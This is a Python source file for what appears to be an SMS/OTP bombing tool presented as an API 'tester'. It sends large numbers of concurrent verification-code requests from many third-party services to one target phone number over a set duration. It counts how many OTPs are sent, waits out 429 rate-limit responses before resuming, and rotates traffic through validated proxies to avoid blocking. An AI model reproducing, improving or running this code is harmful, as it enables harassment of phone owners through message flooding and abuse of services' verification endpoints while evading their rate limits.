from __future__ import annotations

import asyncio
import copy
import time
import random
from typing import Dict, List, Optional

import aiohttp # type: ignore
from aiohttp import TCPConnector # type: ignore
from aiohttp_socks import ProxyConnector # type: ignore

from helpers import replacePlaceholders # type: ignore


# ---------------------------------------------------------------------------
# Stats
# ---------------------------------------------------------------------------

class ApiStat:
    def __init__(self):
        self.success = 0
        self.fail = 0
        self.otp = 0
        self.rateLimited = 0
        self.totalLatencyMs = 0.0
        self.latencyCount = 0

    def recordLatency(self, latencySeconds: float):
        self.totalLatencyMs += latencySeconds * 1000
        self.latencyCount += 1

    def avgMs(self) -> float:
        if self.latencyCount == 0:
            return 0.0
        return round(self.totalLatencyMs / self.latencyCount, 1)


class Stats:
    def __init__(self, apiNames: List[str]) -> None:
        self.startTime = time.time()
        self.total = 0
        self.errors = 0
        self.otpSent = 0
        self.perApi: Dict[str, ApiStat] = {name: ApiStat() for name in apiNames}
        self._lock = asyncio.Lock()

    def elapsed(self) -> float:
        return time.time() - self.startTime

    def rps(self) -> float:
        e = self.elapsed()
        return round(self.total / e, 2) if e > 0 else 0.0

    async def recordSuccess(self, name: str, latency: float, isOtp: bool) -> None:
        async with self._lock:
            self.total += 1
            s = self.perApi[name]
            s.success += 1
            s.recordLatency(latency)
            if isOtp:
                s.otp += 1
                self.otpSent += 1

    async def recordFail(self, name: str, isRateLimit: bool = False) -> None:
        async with self._lock:
            self.total += 1
            self.errors += 1
            s = self.perApi[name]
            s.fail += 1
            if isRateLimit:
                s.rateLimited += 1

    async def recordError(self, name: str) -> None:
        async with self._lock:
            self.errors += 1
            self.perApi[name].fail += 1

    def snapshot(self) -> dict:
        perApi = {}
        for name, s in self.perApi.items():
            perApi[name] = {
                "success": s.success,
                "fail": s.fail,
                "otp": s.otp,
                "avgMs": s.avgMs(),
            }
        return {
            "total": self.total,
            "errors": self.errors,
            "otpSent": self.otpSent,
            "elapsed": round(self.elapsed(), 1),
            "rps": self.rps(),
            "perApi": perApi,
        }


# ---------------------------------------------------------------------------
# Core API caller
# ---------------------------------------------------------------------------

def isOtpSuccess(status: int, text: str) -> bool:
    t = text.lower()
    if status in (200, 201, 202):
        if any(k in t for k in ["otp", "sent", "verification", "generated", "success"]):
            return True
        if '"success":true' in t or '"status":"success"' in t:
            return True
        if "ok" in t:
            return True
    return False


async def checkProxy(proxy: str) -> Optional[str]:
    try:
        connector = ProxyConnector.from_url(proxy)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(
                "http://httpbin.org/ip",
                timeout=aiohttp.ClientTimeout(total=5)
            ):
                return proxy
    except Exception:
        return None


async def validateProxies(proxyList: List[str]) -> List[str]:
    results = await asyncio.gather(*[checkProxy(p) for p in proxyList])
    return [p for p in results if p]


async def callApi(
    session: aiohttp.ClientSession,
    api: dict,
    phone: str,
    stats: Stats,
    cooldowns: Dict[str, float],
    stopEvent: asyncio.Event,
) -> None:
    name = api["name"]

    if stopEvent.is_set():
        return

    if cooldowns.get(name, 0) > time.time():
        return

    for attempt in range(3):
        if stopEvent.is_set():
            return
        try:
            cfg = copy.deepcopy(api)
            headers = replacePlaceholders(cfg.get("headers"), phone)
            params = replacePlaceholders(cfg.get("params"), phone)
            jsonData = replacePlaceholders(cfg.get("json"), phone)
            data = replacePlaceholders(cfg.get("data"), phone)
            cookies = replacePlaceholders(cfg.get("cookies"), phone)
            url = cfg["url"].replace("{phone}", phone)

            t0 = time.time()
            async with session.request(
                cfg["method"], url,
                headers=headers, params=params,
                json=jsonData, data=data, cookies=cookies,
                timeout=aiohttp.ClientTimeout(total=10),
            ) as resp:
                latency = time.time() - t0
                text = await resp.text()

                if isOtpSuccess(resp.status, text):
                    await stats.recordSuccess(name, latency, isOtp=True)
                    return

                if resp.status == 429:
                    cooldowns[name] = time.time() + 10
                    await stats.recordFail(name, isRateLimit=True)
                    return

                if resp.status < 400:
                    await stats.recordSuccess(name, latency, isOtp=False)
                    return

                if attempt == 2:
                    await stats.recordFail(name)
                continue

        except Exception:
            if attempt == 2:
                await stats.recordError(name)
            continue


# ---------------------------------------------------------------------------
# Single API test (used by admin endpoint tester)
# ---------------------------------------------------------------------------

async def testSingleApi(api: dict, phone: str) -> dict:
    """Fire one request to one API and return status + response snippet."""
    try:
        cfg = copy.deepcopy(api)
        headers = replacePlaceholders(cfg.get("headers"), phone)
        params = replacePlaceholders(cfg.get("params"), phone)
        jsonData = replacePlaceholders(cfg.get("json"), phone)
        data = replacePlaceholders(cfg.get("data"), phone)
        cookies = replacePlaceholders(cfg.get("cookies"), phone)
        url = cfg["url"].replace("{phone}", phone)

        connector = TCPConnector(limit=10)
        async with aiohttp.ClientSession(connector=connector) as session:
            t0 = time.time()
            async with session.request(
                cfg["method"], url,
                headers=headers, params=params,
                json=jsonData, data=data, cookies=cookies,
                timeout=aiohttp.ClientTimeout(total=15),
            ) as resp:
                latency = round((time.time() - t0) * 1000)
                text = await resp.text()
                snippet = text[:300].strip()
                return {
                    "ok": True,
                    "status": resp.status,
                    "latencyMs": latency,
                    "snippet": snippet,
                }
    except Exception as e:
        return {"ok": False, "error": str(e)}


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

class TesterRunner:
    def __init__(
        self,
        phone: str,
        duration: int,
        workers: int,
        useProxy: bool,
        proxyList: Optional[List[str]] = None,
    ) -> None:
        self.phone = phone
        self.duration = duration
        self.workers = workers
        self.useProxy = useProxy
        self._proxyList = proxyList or []

        # Import here to avoid circular imports at module load time
        from bot.services.api_manager import apiManager
        self._apiConfigs = apiManager.getMergedConfigs()

        self.stats = Stats([a["name"] for a in self._apiConfigs])
        self._stopEvent = asyncio.Event()
        self._tasks: List[asyncio.Task] = []
        self._running = False

    @property
    def isRunning(self) -> bool:
        return self._running

    async def start(self) -> None:
        self._running = True
        self._stopEvent.clear()
        self.stats = Stats([a["name"] for a in self._apiConfigs])

        proxyList: List[str] = []
        if self.useProxy and self._proxyList:
            proxyList = await validateProxies(self._proxyList)

        endTime = time.time() + self.duration
        cooldowns: Dict[str, float] = {}

        for i in range(self.workers):
            proxy = proxyList[i % len(proxyList)] if proxyList else None
            task = asyncio.create_task(
                self._sender(endTime, proxy, cooldowns),
                name=f"sender_{i}",
            )
            self._tasks.append(task)

        watchdog = asyncio.create_task(self._watchdog(), name="watchdog")
        self._tasks.append(watchdog)

    async def stop(self) -> None:
        self._stopEvent.set()
        for t in self._tasks:
            t.cancel()
        await asyncio.gather(*self._tasks, return_exceptions=True)
        self._tasks.clear()
        self._running = False

    async def _watchdog(self) -> None:
        senderTasks = [t for t in self._tasks if t.get_name() != "watchdog"]
        if senderTasks:
            await asyncio.gather(*senderTasks, return_exceptions=True)
        self._running = False

    async def _sender(
        self,
        endTime: float,
        proxy: Optional[str],
        cooldowns: Dict[str, float],
    ) -> None:
        connector = ProxyConnector.from_url(proxy) if proxy else TCPConnector(limit=200)
        async with aiohttp.ClientSession(connector=connector) as session:
            activeTasks: set = set()
            while time.time() < endTime and not self._stopEvent.is_set():
                activeTasks = {t for t in activeTasks if not t.done()}

                if len(activeTasks) >= 60:
                    await asyncio.sleep(0.05)
                    continue

                api = random.choice(self._apiConfigs)
                task = asyncio.create_task(
                    callApi(session, api, self.phone, self.stats, cooldowns, self._stopEvent)
                )
                activeTasks.add(task)
                await asyncio.sleep(0)

            for t in activeTasks:
                t.cancel()
            if activeTasks:
                await asyncio.gather(*activeTasks, return_exceptions=True)